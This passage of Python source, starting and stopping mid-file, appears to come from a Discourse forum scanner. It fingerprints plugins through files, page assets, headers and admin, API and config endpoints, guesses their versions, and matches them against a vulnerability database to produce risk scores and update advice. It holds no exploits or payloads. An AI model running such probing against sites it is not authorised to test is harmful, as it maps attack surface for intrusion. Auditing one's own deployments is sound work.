            except Exception as e:
                continue
        
        return 'Unknown'
    
    def _extract_version_from_content(self, plugin_name, content):
        """Extract version from content using various patterns"""
        # Version patterns
        version_patterns = [
            # Standard version patterns
            r'version["\']?\s*[:=]\s*["\']([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            r'VERSION\s*=\s*["\']([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            r'@version\s+([\d\.]+(?:-[a-zA-Z0-9]+)?)',
            
            # Plugin-specific patterns
            rf'{plugin_name}["\']?\s*[:=]\s*["\']([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            rf'plugin["\']?\s*[:=]\s*["\']([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            
            # Ruby gem version patterns
            r'gem\s+["\']' + plugin_name + r'["\'],\s*["\']([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            r's\.version\s*=\s*["\']([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            
            # Package.json patterns
            r'"version"\s*:\s*"([\d\.]+(?:-[a-zA-Z0-9]+)?)"',
            
            # Comment-based version patterns
            r'#\s*Version:?\s*([\d\.]+(?:-[a-zA-Z0-9]+)?)',
            r'//\s*Version:?\s*([\d\.]+(?:-[a-zA-Z0-9]+)?)',
            r'/\*\s*Version:?\s*([\d\.]+(?:-[a-zA-Z0-9]+)?)\s*\*/',
            
            # Git tag patterns
            r'tag["\']?\s*[:=]\s*["\']v?([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']',
            r'release["\']?\s*[:=]\s*["\']v?([\d\.]+(?:-[a-zA-Z0-9]+)?)["\']'
        ]
        
        for pattern in version_patterns:
            try:
                match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
                if match:
                    version = match.group(1)
                    # Validate version format
                    if re.match(r'^\d+(\.\d+)*(-[a-zA-Z0-9]+)?$', version):
                        return version
            except Exception as e:
                continue
        
        return 'Unknown'
    
    def _detect_plugins_comprehensive(self):
        """Comprehensive plugin detection using multiple methods"""
        
        # Method 1: File-based detection
        self._detect_plugins_by_files()
        
        # Method 2: HTML pattern detection
        self._detect_plugins_by_html_patterns()
        
        # Method 3: JavaScript pattern detection
        self._detect_plugins_by_js_patterns()
        
        # Method 4: Response header detection
        self._detect_plugins_by_headers()
        
        # Method 5: Admin endpoint detection
        self._detect_plugins_by_admin_endpoints()
        
        # Method 6: CSS pattern detection
        self._detect_plugins_by_css_patterns()
        
        # Method 7: Meta tag detection
        self._detect_plugins_by_meta_patterns()
        
        # Method 8: API endpoint detection
        self._detect_plugins_by_api_endpoints()
        
        # Method 9: Directory enumeration
        self._detect_plugins_by_directory_enum()
        
        # Method 10: Plugin manifest detection
        self._detect_plugins_by_manifest()
        
        # Method 11: Plugin asset detection
        self._detect_plugins_by_assets()
        
        # Method 12: Plugin route detection
        self._detect_plugins_by_routes()
        
        # Method 13: Plugin configuration detection
        self._detect_plugins_by_config()
        
        # Method 14: Plugin database detection
        self._detect_plugins_by_database()
        
        # Method 15: Plugin webhook detection
        self._detect_plugins_by_webhooks()
    
    def _detect_plugins_by_files(self):
        """Detect plugins by checking for specific files"""
        for plugin_name, signatures in self.plugin_signatures.items():
            if 'files' in signatures:
                for file_path in signatures['files']:
                    try:
                        response = make_request(self.scanner.session, 'GET', 
                                              urljoin(self.scanner.target_url, file_path),
                                              timeout=self.scanner.timeout)
                        if response and response.status_code == 200:
                            self._add_detected_plugin(plugin_name, 'file_detection', file_path)
                            if self.scanner.verbose:
                                self.scanner.log(f"Plugin detected via file: {plugin_name} ({file_path})", 'success')
                    except Exception as e:
                        continue
    
    def _detect_plugins_by_html_patterns(self):
        """Detect plugins by HTML patterns in main page"""
        try:
            response = make_request(self.scanner.session, 'GET', self.scanner.target_url,
                                  timeout=self.scanner.timeout)
            if response and response.status_code == 200:
                html_content = response.text
                
                for plugin_name, signatures in self.plugin_signatures.items():
                    if 'html_patterns' in signatures:
                        for pattern in signatures['html_patterns']:
                            if re.search(pattern, html_content, re.IGNORECASE):
                                self._add_detected_plugin(plugin_name, 'html_pattern', pattern)
                                if self.scanner.verbose:
                                    self.scanner.log(f"Plugin detected via HTML pattern: {plugin_name}", 'success')
        except Exception as e:
            self.scanner.log(f"Error in HTML pattern detection: {e}", 'error')
    
    def _detect_plugins_by_js_patterns(self):
        """Detect plugins by JavaScript patterns"""
        js_urls = self._extract_js_urls()
        
        for js_url in js_urls:
            try:
                response = make_request(self.scanner.session, 'GET', js_url,
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    js_content = response.text
                    
                    for plugin_name, signatures in self.plugin_signatures.items():
                        if 'js_patterns' in signatures:
                            for pattern in signatures['js_patterns']:
                                if re.search(pattern, js_content, re.IGNORECASE):
                                    self._add_detected_plugin(plugin_name, 'js_pattern', pattern)
                                    if self.scanner.verbose:
                                        self.scanner.log(f"Plugin detected via JS pattern: {plugin_name}", 'success')
            except Exception as e:
                continue
    
    def _detect_plugins_by_headers(self):
        """Detect plugins by response headers"""
        try:
            response = make_request(self.scanner.session, 'GET', self.scanner.target_url,
                                  timeout=self.scanner.timeout)
            if response:
                headers = response.headers
                
                for plugin_name, signatures in self.plugin_signatures.items():
                    if 'response_headers' in signatures:
                        for header in signatures['response_headers']:
                            if header in headers:
                                self._add_detected_plugin(plugin_name, 'response_header', header)
                                if self.scanner.verbose:
                                    self.scanner.log(f"Plugin detected via header: {plugin_name}", 'success')
        except Exception as e:
            self.scanner.log(f"Error in header detection: {e}", 'error')
    
    def _detect_plugins_by_admin_endpoints(self):
        """Detect plugins by checking admin endpoints"""
        admin_endpoints = [
            '/admin/plugins',
            '/admin/plugins.json',
            '/admin/site_settings/category/plugins'
        ]
        
        for endpoint in admin_endpoints:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, endpoint),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    self._parse_admin_plugin_response(response.text, endpoint)
            except Exception as e:
                continue
    
    def _detect_plugins_by_css_patterns(self):
        """Detect plugins by CSS patterns"""
        css_urls = self._extract_css_urls()
        
        for css_url in css_urls:
            try:
                response = make_request(self.scanner.session, 'GET', css_url,
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    css_content = response.text
                    
                    for plugin_name, signatures in self.plugin_signatures.items():
                        if 'css_patterns' in signatures:
                            for pattern in signatures['css_patterns']:
                                if re.search(pattern, css_content, re.IGNORECASE):
                                    self._add_detected_plugin(plugin_name, 'css_pattern', pattern)
                                    if self.scanner.verbose:
                                        self.scanner.log(f"Plugin detected via CSS pattern: {plugin_name}", 'success')
            except Exception as e:
                continue
    
    def _detect_plugins_by_meta_patterns(self):
        """Detect plugins by meta tag patterns"""
        try:
            response = make_request(self.scanner.session, 'GET', self.scanner.target_url,
                                  timeout=self.scanner.timeout)
            if response and response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                meta_tags = soup.find_all('meta')
                
                for plugin_name, signatures in self.plugin_signatures.items():
                    if 'meta_patterns' in signatures:
                        for pattern in signatures['meta_patterns']:
                            for meta in meta_tags:
                                meta_content = str(meta)
                                if re.search(pattern, meta_content, re.IGNORECASE):
                                    self._add_detected_plugin(plugin_name, 'meta_pattern', pattern)
                                    if self.scanner.verbose:
                                        self.scanner.log(f"Plugin detected via meta pattern: {plugin_name}", 'success')
        except Exception as e:
            self.scanner.log(f"Error in meta pattern detection: {e}", 'error')
    
    def _detect_plugins_by_api_endpoints(self):
        """Detect plugins by API endpoints"""
        api_endpoints = [
            '/site.json',
            '/about.json',
            '/admin/plugins.json',
            '/admin/site_settings.json'
        ]
        
        for endpoint in api_endpoints:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, endpoint),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    self._parse_api_plugin_response(response.text, endpoint)
            except Exception as e:
                continue
    
    def _detect_plugins_by_directory_enum(self):
        """Detect plugins by directory enumeration"""
        plugin_dirs = [
            '/plugins/',
            '/assets/plugins/',
            '/javascripts/plugins/',
            '/stylesheets/plugins/'
        ]
        
        for plugin_dir in plugin_dirs:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, plugin_dir),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    self._parse_directory_listing(response.text, plugin_dir)
            except Exception as e:
                continue
    
    def _detect_plugins_by_manifest(self):
        """Detect plugins by manifest files"""
        manifest_files = [
            '/manifest.json',
            '/plugin.json',
            '/plugins/manifest.json'
        ]
        
        for manifest_file in manifest_files:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, manifest_file),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    self._parse_manifest_file(response.text, manifest_file)
            except Exception as e:
                continue
    
    def _detect_plugins_by_assets(self):
        """Detect plugins by checking asset files and directories"""
        # Common plugin asset paths
        asset_paths = [
            '/assets/plugins/',
            '/plugins/assets/',
            '/javascripts/plugins/',
            '/stylesheets/plugins/',
            '/images/plugins/',
            '/uploads/plugins/'
        ]
        
        for base_path in asset_paths:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, base_path),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    # Parse directory listing or asset references
                    content = response.text
                    
                    # Look for plugin names in directory listings
                    plugin_patterns = [
                        r'href="([^"]+)"',
                        r'src="[^"]*plugins/([^/"]+)',
                        r'href="[^"]*plugins/([^/"]+)',
                        r'/plugins/([^/\s"]+)'
                    ]
                    
                    for pattern in plugin_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if isinstance(match, str) and len(match) > 2:
                                # Clean plugin name
                                plugin_name = match.strip('/').split('/')[0]
                                if plugin_name and not plugin_name.startswith('.'):
                                    self._add_detected_plugin(plugin_name, 'asset_detection', base_path)
            except Exception as e:
                continue
    
    def _detect_plugins_by_routes(self):
        """Detect plugins by checking plugin-specific routes"""
        # Common plugin route patterns
        plugin_routes = [
            '/admin/plugins',
            '/admin/site_settings/category/plugins',
            '/admin/customize/themes',
            '/admin/customize/components',
            '/admin/api/plugins',
            '/plugins/explorer',
            '/plugins/poll',
            '/plugins/chat',
            '/plugins/discourse-calendar',
            '/plugins/discourse-voting',
            '/plugins/discourse-solved',
            '/plugins/discourse-assign',
            '/plugins/discourse-checklist',
            '/plugins/discourse-math',
            '/plugins/discourse-spoiler-alert',
            '/plugins/discourse-reactions',
            '/plugins/discourse-follow',
            '/plugins/discourse-gamification',
            '/plugins/discourse-encrypt',
            '/plugins/discourse-sitemap',
            '/plugins/discourse-prometheus',
            '/plugins/discourse-oauth2-basic',
            '/plugins/discourse-saml',
            '/plugins/discourse-openid-connect',
            '/plugins/discourse-ldap-auth',
            '/plugins/discourse-github',
            '/plugins/discourse-google-oauth2',
            '/plugins/discourse-facebook',
            '/plugins/discourse-twitter',
            '/plugins/discourse-linkedin-auth',
            '/plugins/discourse-microsoft-auth'
        ]
        
        for route in plugin_routes:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, route),
                                      timeout=self.scanner.timeout)
                if response and response.status_code in [200, 302, 403]:  # Plugin exists if not 404
                    plugin_name = route.split('/')[-1]
                    if plugin_name:
                        self._add_detected_plugin(plugin_name, 'route_detection', route)
            except Exception as e:
                continue
    
    def _detect_plugins_by_config(self):
        """Detect plugins by checking configuration endpoints"""
        config_endpoints = [
            '/admin/site_settings.json',
            '/admin/plugins.json',
            '/site.json',
            '/site/basic-info.json',
            '/admin/customize/themes.json',
            '/admin/customize/components.json'
        ]
        
        for endpoint in config_endpoints:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, endpoint),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    try:
                        data = json.loads(response.text)
                        
                        # Look for plugin references in configuration
                        content_str = str(data).lower()
                        
                        # Common plugin indicators in config
                        plugin_indicators = [
                            'discourse-',
                            'plugin_',
                            '_plugin',
                            'poll_',
                            'chat_',
                            'calendar_',
                            'voting_',
                            'solved_',
                            'assign_',
                            'checklist_',
                            'math_',
                            'spoiler_',
                            'reactions_',
                            'follow_',
                            'encrypt_',
                            'sitemap_',
                            'prometheus_',
                            'oauth2_',
                            'saml_',
                            'openid_',
                            'ldap_',
                            'github_',
                            'google_',
                            'facebook_',
                            'twitter_',
                            'linkedin_',
                            'microsoft_'
                        ]
                        
                        for indicator in plugin_indicators:
                            if indicator in content_str:
                                plugin_name = indicator.strip('_')
                                self._add_detected_plugin(plugin_name, 'config_detection', endpoint)
                    except Exception as e:
                        pass
            except Exception as e:
                continue
    
    def _detect_plugins_by_database(self):
        """Detect plugins by checking database-related endpoints"""
        # Database endpoints that might reveal plugin info
        db_endpoints = [
            '/admin/plugins/explorer/queries.json',
            '/admin/reports.json',
            '/admin/dashboard.json',
            '/admin/dashboard/general.json'
        ]
        
        for endpoint in db_endpoints:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, endpoint),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    try:
                        data = json.loads(response.text)
                        content_str = str(data).lower()
                        
                        # Look for plugin table names or references
                        plugin_db_patterns = [
                            'plugin_store_rows',
                            'discourse_poll',
                            'discourse_chat',
                            'discourse_calendar',
                            'discourse_voting',
                            'discourse_solved',
                            'discourse_assign',
                            'discourse_checklist',
                            'discourse_reactions',
                            'discourse_follow',
                            'discourse_encrypt'
                        ]
                        
                        for pattern in plugin_db_patterns:
                            if pattern in content_str:
                                plugin_name = pattern.replace('discourse_', '').replace('_', '-')
                                self._add_detected_plugin(plugin_name, 'database_detection', endpoint)
                    except Exception as e:
                        pass
            except Exception as e:
                continue
    
    def _detect_plugins_by_webhooks(self):
        """Detect plugins by checking webhook configurations"""
        webhook_endpoints = [
            '/admin/api/web_hooks.json',
            '/admin/plugins/chat/hooks.json',
            '/admin/plugins/discourse-slack-official/hooks.json',
            '/admin/plugins/discourse-telegram/hooks.json',
            '/admin/plugins/discourse-discord/hooks.json'
        ]
        
        for endpoint in webhook_endpoints:
            try:
                response = make_request(self.scanner.session, 'GET',
                                      urljoin(self.scanner.target_url, endpoint),
                                      timeout=self.scanner.timeout)
                if response and response.status_code == 200:
                    try:
                        data = json.loads(response.text)
                        
                        # Extract plugin names from webhook data
                        if isinstance(data, dict) and 'web_hooks' in data:
                            for hook in data['web_hooks']:
                                if isinstance(hook, dict):
                                    # Look for plugin indicators in webhook URLs or payloads
                                    hook_str = str(hook).lower()
                                    if 'slack' in hook_str:
                                        self._add_detected_plugin('discourse-slack-official', 'webhook_detection', endpoint)
                                    elif 'telegram' in hook_str:
                                        self._add_detected_plugin('discourse-telegram', 'webhook_detection', endpoint)
                                    elif 'discord' in hook_str:
                                        self._add_detected_plugin('discourse-discord', 'webhook_detection', endpoint)
                                    elif 'chat' in hook_str:
                                        self._add_detected_plugin('chat', 'webhook_detection', endpoint)
                    except Exception as e:
                        pass
            except Exception as e:
                continue
    
    def _discover_plugin_endpoints(self):
        """Discover plugin-specific endpoints"""
        self.scanner.log("Discovering plugin endpoints...", 'info')
        
        # Common plugin endpoint patterns
        endpoint_patterns = [
            '/plugins/{plugin}/assets/',
            '/plugins/{plugin}/javascripts/',
            '/plugins/{plugin}/stylesheets/',
            '/admin/plugins/{plugin}',
            '/admin/plugins/{plugin}/settings',
            '/{plugin}/',
            '/api/{plugin}/',
            '/webhooks/{plugin}'
        ]
        
        detected_plugins = [p['name'] for p in self.results['detected_plugins']]
        
        for plugin_name in detected_plugins:
            plugin_short = plugin_name.replace('discourse-', '')
            
            for pattern in endpoint_patterns:
                endpoint = pattern.format(plugin=plugin_short)
                try:
                    response = make_request(self.scanner.session, 'GET',
                                          urljoin(self.scanner.target_url, endpoint),
                                          timeout=self.scanner.timeout)
                    if response and response.status_code in [200, 403, 401]:
                        self.results['plugin_endpoints'].append({
                            'plugin': plugin_name,
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'accessible': response.status_code == 200
                        })
                        self.scanner.log(f"Plugin endpoint found: {endpoint} (Status: {response.status_code})", 'info')
                except Exception as e:
                    continue
    
    def _assess_plugin_vulnerabilities(self):
        """Assess vulnerabilities for detected plugins"""
        self.scanner.log("Assessing plugin vulnerabilities...", 'info')
        
        if 'plugins' not in self.plugin_vulnerabilities:
            return
        
        detected_plugin_names = [p['name'] for p in self.results['detected_plugins']]
        
        for plugin_data in self.plugin_vulnerabilities['plugins']:
            plugin_name = plugin_data.get('name', '')
            
            if plugin_name in detected_plugin_names:
                vulnerabilities = plugin_data.get('vulnerabilities', [])
                
                for vuln in vulnerabilities:
                    vuln_info = {
                        'plugin_name': plugin_name,
                        'cve_id': vuln.get('cve_id', 'N/A'),
                        'severity': vuln.get('severity', 'Unknown'),
                        'cvss_score': vuln.get('cvss_score', 'N/A'),
                        'type': vuln.get('type', 'Unknown'),
                        'description': vuln.get('description', ''),
                        'affected_versions': vuln.get('affected_versions', []),
                        'fixed_versions': vuln.get('fixed_versions', []),
                        'exploit_available': vuln.get('exploit_available', False),
                        'payload_examples': vuln.get('payload_examples', []),
                        'impact': vuln.get('impact', 'Unknown')
                    }
                    
                    self.results['vulnerability_plugins'].append(vuln_info)
                    
                    severity_color = 'critical' if vuln.get('severity') == 'Critical' else 'warning'
                    self.scanner.log(f"Vulnerability found in {plugin_name}: {vuln.get('cve_id', 'Unknown')} ({vuln.get('severity', 'Unknown')})", severity_color)
    
    def _add_detected_plugin(self, name, detection_method, evidence):
        """Add a detected plugin to results"""
        # Check if plugin already detected
        for plugin in self.results['detected_plugins']:
            if plugin['name'] == name:
                if detection_method not in plugin['detection_methods']:
                    plugin['detection_methods'].append(detection_method)
                    plugin['evidence'].append(evidence)
                return
        
        # Add new plugin
        plugin_info = {
            'name': name,
            'detection_methods': [detection_method],
            'evidence': [evidence],
            'category': self._get_plugin_category(name),
            'risk_score': self._calculate_risk_score(name),
            'version': self._detect_plugin_version(name)
        }
        
        self.results['detected_plugins'].append(plugin_info)
    
    def _get_plugin_category(self, plugin_name):
        """Get plugin category from vulnerability database"""
        if 'plugins' in self.plugin_vulnerabilities:
            for plugin in self.plugin_vulnerabilities['plugins']:
                if plugin.get('name') == plugin_name:
                    return plugin.get('category', 'Unknown')
        return 'Unknown'
    
    def _calculate_risk_score(self, plugin_name):
        """Calculate risk score for plugin"""
        if 'plugins' in self.plugin_vulnerabilities:
            for plugin in self.plugin_vulnerabilities['plugins']:
                if plugin.get('name') == plugin_name:
                    return plugin.get('risk_score', 0)
        return 0
    
    def _extract_js_urls(self):
        """Extract JavaScript URLs from main page"""
        js_urls = []
        try:
            response = make_request(self.scanner.session, 'GET', self.scanner.target_url,
                                  timeout=self.scanner.timeout)
            if response and response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                scripts = soup.find_all('script', src=True)
                
                for script in scripts:
                    src = script.get('src')
                    if src:
                        if src.startswith('//'):
                            src = 'https:' + src
                        elif src.startswith('/'):
                            src = urljoin(self.scanner.target_url, src)
                        js_urls.append(src)
        except Exception as e:
            pass
        
        return js_urls
    
    def _extract_css_urls(self):
        """Extract CSS URLs from main page"""
        css_urls = []
        try:
            response = make_request(self.scanner.session, 'GET', self.scanner.target_url,
                                  timeout=self.scanner.timeout)
            if response and response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                links = soup.find_all('link', rel='stylesheet')
                
                for link in links:
                    href = link.get('href')
                    if href:
                        if href.startswith('//'):
                            href = 'https:' + href
                        elif href.startswith('/'):
                            href = urljoin(self.scanner.target_url, href)
                        css_urls.append(href)
        except Exception as e:
            pass
        
        return css_urls
    
    def _parse_admin_plugin_response(self, content, endpoint):
        """Parse admin plugin response for plugin information"""
        try:
            if endpoint.endswith('.json'):
                data = json.loads(content)
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict) and 'name' in item:
                            self._add_detected_plugin(item['name'], 'admin_endpoint', endpoint)
                elif isinstance(data, dict) and 'plugins' in data:
                    for plugin in data['plugins']:
                        if 'name' in plugin:
                            self._add_detected_plugin(plugin['name'], 'admin_endpoint', endpoint)
            else:
                # Parse HTML for plugin names
                soup = BeautifulSoup(content, 'html.parser')
                plugin_elements = soup.find_all(attrs={'data-plugin-name': True})
                for element in plugin_elements:
                    plugin_name = element.get('data-plugin-name')
                    if plugin_name:
                        self._add_detected_plugin(plugin_name, 'admin_endpoint', endpoint)
        except Exception as e:
            pass
    
    def _parse_api_plugin_response(self, content, endpoint):
        """Parse API response for plugin information"""
        try:
            data = json.loads(content)
            
            # Check for plugin information in various API responses
            if endpoint == '/site.json' and isinstance(data, dict):
                # Check for plugin-related settings
                if 'plugins' in data:
                    for plugin in data['plugins']:
                        if isinstance(plugin, str):
                            self._add_detected_plugin(plugin, 'api_endpoint', endpoint)
                        elif isinstance(plugin, dict) and 'name' in plugin:
                            self._add_detected_plugin(plugin['name'], 'api_endpoint', endpoint)
                
                # Check for plugin-specific configurations
                for key, value in data.items():
                    if 'plugin' in key.lower() and isinstance(value, (str, dict)):
                        if isinstance(value, str) and value.startswith('discourse-'):
                            self._add_detected_plugin(value, 'api_endpoint', endpoint)
            
            elif endpoint == '/about.json' and isinstance(data, dict):
                # Check for plugin mentions in about page
                if 'plugins' in data:
                    for plugin in data['plugins']:
                        if isinstance(plugin, dict) and 'name' in plugin:
                            self._add_detected_plugin(plugin['name'], 'api_endpoint', endpoint)
        
        except Exception as e:
            pass
    
    def _parse_directory_listing(self, content, directory):
        """Parse directory listing for plugin names"""
        try:
            soup = BeautifulSoup(content, 'html.parser')
            links = soup.find_all('a', href=True)
            
            for link in links:
                href = link.get('href')
                if href and href != '../' and href.endswith('/'):
                    plugin_name = href.rstrip('/')
                    if plugin_name.startswith('discourse-') or len(plugin_name) > 3:
                        self._add_detected_plugin(plugin_name, 'directory_listing', directory + href)
        except Exception as e:
            pass
    
    def _parse_manifest_file(self, content, manifest_file):
        """Parse manifest file for plugin information"""
        try:
            data = json.loads(content)
            
            if isinstance(data, dict):
                # Check for plugin name
                if 'name' in data:
                    self._add_detected_plugin(data['name'], 'manifest_file', manifest_file)
                
                # Check for plugins array
                if 'plugins' in data and isinstance(data['plugins'], list):
                    for plugin in data['plugins']:
                        if isinstance(plugin, dict) and 'name' in plugin:
                            self._add_detected_plugin(plugin['name'], 'manifest_file', manifest_file)
                        elif isinstance(plugin, str):
                            self._add_detected_plugin(plugin, 'manifest_file', manifest_file)
        except Exception as e:
            pass
    
    def _extract_theme_name_from_url(self, url):
        """Extract theme name from CSS URL"""
        # Extract theme name from URL patterns
        patterns = [
            r'/themes/([^/]+)/',
            r'/stylesheets/([^/]+)_theme',
            r'/assets/([^/]+)_theme'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return None
    
    def _extract_library_version(self, library_name, content):
        """Extract library version from content"""
        version_patterns = {
            'jQuery': [r'jQuery\s+v?([\d\.]+)', r'jquery[/-]([\d\.]+)'],
            'Ember.js': [r'Ember\s+([\d\.]+)', r'ember[/-]([\d\.]+)'],
            'Bootstrap': [r'Bootstrap\s+v?([\d\.]+)', r'bootstrap[/-]([\d\.]+)']
        }
        
        if library_name in version_patterns:
            for pattern in version_patterns[library_name]:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return match.group(1)
        
        return 'Unknown'
    
    def _assess_security_risks(self):
        """Assess security risks of detected plugins"""
        high_risk_plugins = []
        medium_risk_plugins = []
        total_vulnerabilities = 0
        
        for plugin in self.results['detected_plugins']:
            plugin_name = plugin['name']
            vulnerabilities = self._get_plugin_vulnerabilities(plugin_name)
            risk_score = plugin.get('risk_score', 0)
            
            if vulnerabilities:
                total_vulnerabilities += len(vulnerabilities)
                
                # Categorize by risk level
                if risk_score >= 7.0:
                    high_risk_plugins.append({
                        'name': plugin_name,
                        'risk_score': risk_score,
                        'vulnerabilities': vulnerabilities,
                        'version': plugin.get('version', 'Unknown')
                    })
                elif risk_score >= 4.0:
                    medium_risk_plugins.append({
                        'name': plugin_name,
                        'risk_score': risk_score,
                        'vulnerabilities': vulnerabilities,
                        'version': plugin.get('version', 'Unknown')
                    })
        
        self.results['security_assessment'] = {
            'high_risk_plugins': high_risk_plugins,
            'medium_risk_plugins': medium_risk_plugins,
            'total_vulnerabilities': total_vulnerabilities,
            'risk_summary': {
                'critical_issues': len([p for p in high_risk_plugins if p['risk_score'] >= 9.0]),
                'high_issues': len([p for p in high_risk_plugins if 7.0 <= p['risk_score'] < 9.0]),
                'medium_issues': len(medium_risk_plugins)
            }
        }
    
    def _analyze_plugin_dependencies(self):
        """Analyze plugin dependencies and conflicts"""
        dependencies = {
            'jQuery': [],
            'Ember.js': [],
            'Bootstrap': [],
            'Font Awesome': [],
            'Moment.js': []
        }
        
        # Check which plugins depend on which libraries
        for plugin in self.results['detected_plugins']:
            plugin_name = plugin['name']
            
            # Common dependencies based on plugin type
            if 'calendar' in plugin_name.lower():
                dependencies['Moment.js'].append(plugin_name)
            if 'chat' in plugin_name.lower() or 'poll' in plugin_name.lower():
                dependencies['Ember.js'].append(plugin_name)
            if 'voting' in plugin_name.lower() or 'reactions' in plugin_name.lower():
                dependencies['jQuery'].append(plugin_name)
        
        # Check for detected libraries
        detected_libs = [lib['name'] for lib in self.results['javascript_libraries']]
        
        self.results['dependency_analysis'] = {
            'dependencies': dependencies,
            'detected_libraries': detected_libs,
            'potential_conflicts': self._check_dependency_conflicts(dependencies, detected_libs)
        }
    
    def _check_dependency_conflicts(self, dependencies, detected_libs):
        """Check for potential dependency conflicts"""
        conflicts = []
        
        # Check if required dependencies are missing
        for lib, dependent_plugins in dependencies.items():
            if dependent_plugins and lib not in detected_libs:
                conflicts.append({
                    'type': 'missing_dependency',
                    'library': lib,
                    'affected_plugins': dependent_plugins,
                    'severity': 'medium'
                })
        
        return conflicts
    
    def _generate_performance_metrics(self):
        """Generate performance metrics for the scan"""
        total_plugins = len(self.results['detected_plugins'])
        total_themes = len(self.results['detected_themes'])
        total_js_libs = len(self.results['javascript_libraries'])
        total_css_frameworks = len(self.results['css_frameworks'])
        
        # Calculate detection confidence average
        if total_plugins > 0:
            avg_confidence = sum(p.get('confidence', 0) for p in self.results['detected_plugins']) / total_plugins
        else:
            avg_confidence = 0
        
        # Count detection methods used
        detection_methods = set()
        for plugin in self.results['detected_plugins']:
            detection_methods.update(plugin.get('detection_methods', []))
        
        self.results['performance_metrics'] = {
            'total_plugins_detected': total_plugins,
            'total_themes_detected': total_themes,
            'total_js_libraries_detected': total_js_libs,
            'total_css_frameworks_detected': total_css_frameworks,
            'average_detection_confidence': round(avg_confidence, 2),
            'detection_methods_used': list(detection_methods),
            'scan_coverage': {
                'plugins': 'comprehensive' if total_plugins > 5 else 'basic',
                'themes': 'detected' if total_themes > 0 else 'none',
                'libraries': 'comprehensive' if total_js_libs > 3 else 'basic'
            }
        }
    
    def _vulnerability_assessment(self):
        """Vulnerability assessment with detailed analysis"""
        # First run basic security assessment
        self._assess_security_risks()
        
        # Detailed analysis
        vulnerability_details = []
        
        for plugin in self.results['detected_plugins']:
            plugin_name = plugin['name']
            vulnerabilities = self._get_plugin_vulnerabilities(plugin_name)
            
            for vuln in vulnerabilities:
                vuln_detail = {
                    'plugin_name': plugin_name,
                    'plugin_version': plugin.get('version', 'Unknown'),
                    'cve_id': vuln.get('cve_id', 'N/A'),
                    'severity': vuln.get('severity', 'Unknown'),
                    'cvss_score': vuln.get('cvss_score', 0),
                    'type': vuln.get('type', 'Unknown'),
                    'description': vuln.get('description', 'No description available'),
                    'affected_versions': vuln.get('affected_versions', []),
                    'fixed_versions': vuln.get('fixed_versions', []),
                    'exploit_available': vuln.get('exploit_available', False),
                    'impact': vuln.get('impact', 'Unknown'),
                    'remediation': self._get_remediation_advice(plugin_name, vuln)
                }
                vulnerability_details.append(vuln_detail)
        
        # Sort by CVSS score (highest first)
        vulnerability_details.sort(key=lambda x: x['cvss_score'], reverse=True)
        
        self.results['vulnerability_assessment'] = {
            'total_vulnerabilities': len(vulnerability_details),
            'critical_vulnerabilities': len([v for v in vulnerability_details if v['cvss_score'] >= 9.0]),
            'high_vulnerabilities': len([v for v in vulnerability_details if 7.0 <= v['cvss_score'] < 9.0]),
            'medium_vulnerabilities': len([v for v in vulnerability_details if 4.0 <= v['cvss_score'] < 7.0]),
            'low_vulnerabilities': len([v for v in vulnerability_details if 0 < v['cvss_score'] < 4.0]),
            'vulnerability_details': vulnerability_details,
            'security_recommendations': self._generate_security_recommendations(vulnerability_details)
        }
    
    def _get_remediation_advice(self, plugin_name, vulnerability):
        """Get remediation advice for specific vulnerability"""
        fixed_versions = vulnerability.get('fixed_versions', [])
        
        if fixed_versions:
            latest_fix = max(fixed_versions) if fixed_versions else 'latest'
            return f"Update {plugin_name} to version {latest_fix} or later"
        else:
            return f"Consider disabling {plugin_name} until a fix is available"
    
    def _generate_security_recommendations(self, vulnerability_details):
        """Generate security recommendations based on vulnerabilities"""
        recommendations = []
        
        # Critical vulnerabilities
        critical_vulns = [v for v in vulnerability_details if v['cvss_score'] >= 9.0]
        if critical_vulns:
            recommendations.append({
                'priority': 'CRITICAL',
                'action': 'Immediate action required',
                'description': f"Found {len(critical_vulns)} critical vulnerabilities that require immediate attention",
                'affected_plugins': list(set([v['plugin_name'] for v in critical_vulns]))
            })
        
        # High vulnerabilities
        high_vulns = [v for v in vulnerability_details if 7.0 <= v['cvss_score'] < 9.0]
        if high_vulns:
            recommendations.append({
                'priority': 'HIGH',
                'action': 'Update plugins within 24-48 hours',
                'description': f"Found {len(high_vulns)} high-severity vulnerabilities",
